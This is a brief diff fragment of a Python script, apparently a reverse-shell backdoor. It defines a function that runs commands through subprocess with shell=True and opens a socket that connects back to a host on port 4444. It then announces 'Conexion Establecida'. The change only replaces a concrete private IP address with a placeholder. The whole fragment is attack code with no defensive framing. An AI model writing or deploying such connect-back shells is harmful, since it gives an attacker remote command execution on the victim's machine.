@@ -5,7 +5,7 @@ def ejecutar_comando():
     return subprocess.check_output(command, shell=True)
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.1.155", 4444))
+connection.connect(("192.168.1.x", 4444))
 
 connection.send("\n [+]Conexion Establecida\n")
 
